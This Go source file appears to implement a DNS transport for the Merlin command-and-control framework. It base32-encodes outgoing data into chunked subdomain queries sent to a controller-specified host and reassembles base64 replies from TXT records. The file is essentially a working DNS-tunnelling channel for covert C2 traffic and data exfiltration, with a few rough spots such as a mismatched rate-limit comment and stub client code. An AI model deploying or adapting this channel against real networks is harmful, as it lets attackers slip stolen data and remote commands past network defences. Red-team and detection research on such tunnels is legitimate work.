package dns

import (
	"bytes"
	"crypto/rand"
	"encoding/base32"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/miekg/dns"

	"github.com/Ne0nd0g/merlin/pkg/transport"
)

type DNSCommClient struct {
	client *dnsClient
	Host   string
	NS     string
}

func (h DNSCommClient) New(proto, host, userAgent string) DNSCommClient {
	r := DNSCommClient{}
	c, err := getClient(host)
	if err != nil {
		panic("no")
	}
	r.client = c
	r.Host = host

	return r
}

func aLookup(host, ns string) ([]net.IP, error) {
	c := dns.Client{}
	m := dns.Msg{}

	m.SetQuestion(host+".", dns.TypeA)
	r, _, err := c.Exchange(&m, ns+":53")
	if err != nil {
		fmt.Println("Lookup failed", host)
		return nil, err
	}

	ret := []net.IP{}
	for _, record := range r.Answer {
		ret = append(ret, record.(*dns.A).A)
	}
	return ret, nil
}

func txtLookup(host string, ns string) ([]string, error) {
	c := dns.Client{}
	m := dns.Msg{}
	c.UDPSize = 7000

	m.SetQuestion(host+".", dns.TypeTXT)
	r, _, err := c.Exchange(&m, ns+":53")
	if err != nil {
		panic(err)
	}

	ret := []string{}
	for _, record := range r.Answer {
		ret = append(ret, strings.Join(record.(*dns.TXT).Txt, ""))
	}
	return ret, nil
}

const chunklen = 60

func (h DNSCommClient) Do(b io.Reader) (transport.MerlinResponse, error) {
	ret := transport.MerlinResponse{}
	//read from reader
	byts, e := ioutil.ReadAll(b)
	if e != nil {
		return transport.MerlinResponse{}, e
	}
	//convert to base32
	payloadFull := base32.HexEncoding.WithPadding(base32.NoPadding).EncodeToString(byts)

	chunks := len(payloadFull) / chunklen
	leftover := len(payloadFull) % chunklen

	if leftover > 0 {
		chunks++
	}

	rb := make([]byte, 8)
	rand.Read(rb)

	cmdID := base32.HexEncoding.WithPadding(base32.NoPadding).EncodeToString(rb)
	wg := &sync.WaitGroup{}
	ch := make(chan transport.MerlinResponse, 2)
	limiter := make(chan struct{}, 500) //only send 200 queries at once
	for thisChunk := 1; thisChunk <= chunks; thisChunk++ {
		limiter <- struct{}{}
		wg.Add(1)
		go h.sendChunk(wg, thisChunk, chunks, payloadFull, cmdID, ch, limiter)

	}
	wg.Wait()
	select {
	case ret = <-ch:
	default:
	}
	return ret, nil
}

func (h *DNSCommClient) sendChunk(wg *sync.WaitGroup, thisChunk, chunks int, payloadFull, cmdID string, ch chan transport.MerlinResponse, limiter chan struct{}) {
	defer wg.Done()
	defer func() { <-limiter }()
	min := (thisChunk - 1) * chunklen
	max := thisChunk * chunklen
	if max > len(payloadFull) {
		max = len(payloadFull)
	}
	payload := payloadFull[min:max]
	lookupAddr := fmt.Sprintf("%s.%d.%d.%s.%s", payload, thisChunk, chunks, cmdID, h.Host)
	for {

		rsp, err := aLookup(lookupAddr, h.NS) //net.LookupIP(lookupAddr)
		if err != nil || len(rsp) < 1 {
			time.Sleep(2 * time.Second)
			continue
		}
		z := net.ParseIP("0.0.0.0")
		if z.Equal(rsp[0]) { //all good everyone happy
			break
		}
		//not all 0's, check for leading 1 (we can use a switch here if more codes are used in the future)
		if rsp[0].Mask(net.IPv4Mask(0, 0, 0, 255)).To4()[3] == 1 {
			//leading 1 indicates the need to do a txt lookup. Generate the cmdID
			txtID := base32.HexEncoding.WithPadding(base32.NoPadding).EncodeToString(rsp[0].To4()[0:3])
			//do a txt lookup
			t, e := txtLookup(fmt.Sprintf("%s.%s", txtID, h.Host), h.NS)
			if e == nil && len(t) > 0 {
				tInt, err := strconv.ParseInt(t[0], 10, 32)
				if err != nil {
					fmt.Println(err)
					break
				}
				b64rsp := ""
				for i := 1; i <= int(tInt); i++ {
					txtrsp, err := txtLookup(fmt.Sprintf("%d.%s.%s", i, txtID, h.Host), h.NS)
					if err != nil {
						fmt.Println(err)
					}
					b64rsp = b64rsp + txtrsp[0]
				}
				dcoded, err := base64.RawStdEncoding.DecodeString(b64rsp)
				if err != nil {
					panic(err)
				}
				ch <- transport.MerlinResponse{
					Body:    bytes.NewReader(dcoded),
					BodyLen: int64(len(dcoded)),
				}
			}
			break
		}

	}

}

// getClient returns a HTTP client for the passed in protocol (i.e. h2 or hq)
func getClient(host string) (*dnsClient, error) {
	return &dnsClient{}, nil
}

type dnsClient struct {
}
